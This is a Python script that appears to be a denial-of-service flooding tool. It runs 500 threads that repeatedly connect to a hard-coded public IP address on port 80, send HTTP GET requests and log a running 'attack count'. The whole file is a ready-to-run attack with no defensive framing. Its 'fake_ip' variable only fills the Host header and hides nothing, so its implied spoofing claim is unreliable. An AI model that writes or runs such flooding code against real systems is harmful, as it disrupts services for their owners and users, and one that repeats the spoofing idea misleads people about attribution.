import socket
import threading
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)

# Target server information
target = '142.251.42.14'
fake_ip = '182.21.20.32'
port = 80

# Number of threads to create
num_threads = 500

# Shared variable for tracking attack count
attack_num = 0
attack_num_lock = threading.Lock()

# Attack function
def attack():
    global attack_num

    while True:
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the target
            s.connect((target, port))
            
            # Send HTTP request
            s.sendall(("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(fake_ip)).encode('ascii'))
            
            # Close the socket
            s.close()
            
            # Increment attack count
            with attack_num_lock:
                attack_num += 1
                logging.info(f'Attack count: {attack_num}')
            
            # Sleep briefly to mimic real-world traffic
            time.sleep(0.1)
        
        except Exception as e:
            logging.error(f'Error in attack thread: {e}')
        
        finally:
            s.close()

# Create and start attack threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

# Wait for all threads to complete (you may want to add a stopping condition here)
for thread in threads:
    thread.join()
